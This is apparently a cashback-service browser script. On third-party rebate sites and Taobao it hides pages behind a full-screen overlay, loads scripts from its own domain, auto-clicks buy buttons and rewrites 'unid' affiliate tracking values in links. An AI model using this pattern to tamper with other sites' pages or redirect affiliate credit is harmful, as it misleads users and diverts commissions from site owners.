var zheDomain = 'http://www.jumper.com';

function zheLoadit(src) {
	var head = document.getElementsByTagName('head')[0];
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.src = src + '&' + Math.random();
	head.appendChild(script);
}

function zheInsertLoading() {

	zheLoadImg(zheDomain + '/loading.gif');
	var body = document.getElementsByTagName('body')[0];
	var d = document.createElement('div');
	d.id = 'mask_id_dv';
	body.appendChild(d);
	var characterSet = 'utf8';
	if(navigator.appName=="Netscape"){
		if(document.characterSet!="UTF-8"){
			characterSet = 'gbk';
		}
	}else{
		if(document.charset.toUpperCase()!="UTF-8"){
			characterSet = 'gbk';
		}
	}
	if(characterSet == 'utf8'){
		document.getElementById('mask_id_dv').innerHTML = '<div style="position:fixed; top:0; left:0; z-index:100000000000; width:100%; height:100%; background:#FFF;text-align:center"><br /><br /><br /><br /><br /><br /><br /><br /><h2 style="height:30px">正在激活返利，请稍等 ...</h2><img src="' + zheDomain + '/loading.gif"></div>';
	}else{
		document.getElementById('mask_id_dv').innerHTML = '<div style="position:fixed; top:0; left:0; z-index:100000000000; width:100%; height:100%; background:#FFF;text-align:center"><br /><br /><br /><br /><br /><br /><br /><br /><h2 style="height:30px">Loading ...</h2><img src="' + zheDomain + '/loading.gif"></div>';
	}
}

function zheLoadImg(url){
	var img = new Image();
	img.src = url;
}

function zheGetConvert(iid, pid, appkey, unid) {

	var div = document.createElement('div');
	div.style.display = 'none';
	div.id = 'my_enjoy';
	document.body.appendChild(div);
	document.getElementById('my_enjoy').innerHTML= '<a data-type="0" biz-itemid="'+iid+'" data-rd="1" data-style="2" data-tmpl="192x40" data-tmplid="625"></a>';

	window.unid = unid;
	(function(win,doc){

		var s = doc.createElement("script"), h = doc.getElementsByTagName("head")[0];
		if (!win.alimamatk_show) {
			s.charset = "gbk";
			s.async = true;
			s.src = "http://a.alimama.cn/tkapi.js";
			h.insertBefore(s, h.firstChild);
		};
		var o = {
			pid: pid,
			appkey: appkey,
			unid: unid,
			rd:1
		};
		win.alimamatk_onload = win.alimamatk_onload || [];

		if(win.alimamatk_show){
			KSLITE.provide(["tkapi-main"],
			function(c) {
					c("tkapi-config").r.cache.unid = window.unid;
					c("tkapi-config").r.cache.rd = 1;
			})
			win.alimamatk_onload.push(o);
		}

	})(window,document)

	var i = setInterval(function() {

		zheCount = zheCount + 1;
		if (zheCount == 100) { //10秒容忍度
			loadForceJump(iid);
			clearInterval(i);
		}

		if(window.document.getElementById("writeable_iframe_0")){
			try{
				var topwin = window.document.getElementById("writeable_iframe_0").contentWindow;
				link = topwin.document.getElementsByTagName("a")[0].attributes.getNamedItem("href").nodeValue;
				if(link){

					link = link.replace(/unid%3D.+?%26/g,"unid%3D"+window.unid+"%26");
					link = link.replace('http://fanli.juanpi.com/t?go=', '');
					var referLink = document.createElement('a');
					referLink.href = link;
					referLink.target = '_self';
					document.body.appendChild(referLink);
					clearInterval(i);
					referLink.click();
				}
			}catch(e){

			}
		}

	}, 100);

	return false;
}

function loadForceJump(iid){
	zheLoadit(zheDomain + '/api/alert/jump/can_not_load_tbkapi?=about:blank');
	window.location.href = 'http://item.taobao.com/item.html?id=' + iid;
}

function zhePutOrderTmp(o, n){
	d1 = new Date('2013/11/17 00:00:00');
	d2 = new Date(n.replace(/-/g, "/"));
	if(d2 < d1) zheLoadit(zheDomain + '/api/saveOrderTmpFix/' + o + '/' + n + '?');
}

function zheGetConvertCB() {
	window.zheHasRequesResult = true;
	zheLoadit(zheDomain + '/api/getTaskResultJs/' + zheArgs['taskid'] + '&debug=false');
}

function zhePasteUrl(url){

	var p_zheArgs = new Object();
	if(!url)
		var p_zheQuery = location.search.substring(1); // Get url string
	else
		var p_zheQuery = url.substring(url.indexOf('?')+1);

	var p_zhePairs = p_zheQuery.split("&"); // Break at ampersand

	for (var i = 0; i < p_zhePairs.length; i++) {
		var pos = p_zhePairs[i].indexOf('='); // Look for "name=value"
		if (pos == -1) continue; // If not found, skip
		var argname = p_zhePairs[i].substring(0, pos); // Extract the name
		var value = p_zhePairs[i].substring(pos + 1); // Extract the value
		value = decodeURIComponent(value); // Decode it, if needed
		if (value && value != 'undefined') {
			p_zheArgs[argname] = value; // Store as a property
		} else {
			p_zheArgs[argname] = 0; // Store as a property
		}
	}

	return p_zheArgs;
}

var zheHost = location.host;
var zheHref = location.href;
var zheArgs = zhePasteUrl('');

if (navigator.userAgent.indexOf("MSIE") > 0)
	is_ie = true;
else
	is_ie = false;

var zheCount = 1;
window.zheHasRequesResult = false;

//解决IE9以下无getElementsByClassName
if (!document.getElementsByClassName) {
	document.getElementsByClassName = function(cl){
		var retnode = [];
		var elem = this.getElementsByTagName('*');
		for (var i = 0; i < elem.length; i++) {
			if((' ' + elem[i].className + ' ').indexOf(' ' + cl + ' ') > -1) retnode.push(elem[i]);
		}
		return retnode;
	}
}

if (zheHost == 'fun.51fanli.com' && zheHref.indexOf('goshopapi') > 0) {

	zheInsertLoading();
	document.getElementsByTagName('div')[0].style.display = 'none';
	document.getElementsByTagName('div')[1].style.display = 'none';

}if (zheHost == 'fun.51fanli.com' && zheHref.indexOf('goshop') > 0) {

	if(document.getElementById('J_gstn_igot')){
		document.getElementById('J_gstn_igot').click();
	}

} else if (zheHost == 'www.baobeisha.com' && zheHref.indexOf('taskid') > 0) {

	zheInsertLoading();
	zheGetConvertCB();

} else if (zheHost == 'www.jsfanli.com' && zheHref.indexOf('taskid') > 0) {

	zheInsertLoading();
	zheGetConvertCB();

}else if (zheHost == 'fanli.juanpi.com' && zheHref.indexOf('taskid') > 0) {

	zheInsertLoading();
	zheGetConvertCB();

} else if ( zheHost == 'www.fanxian.com' && zheHref.indexOf('taskid') > 0) {

	zheInsertLoading();
	zheGetConvertCB();

} else if (zheHost == 're.taobao.com' && zheHref.indexOf('unid') > 0) {

	obj = document.getElementsByClassName('btnBuy');
	obj[0].target="_self";
	obj[0].click();

} else if (zheHost == 'ai.taobao.com' && zheHref.indexOf('unid') > 0) {

	obj = document.getElementsByClassName('go-to-buy');
	obj[0].target="_self";
	obj[0].click();

}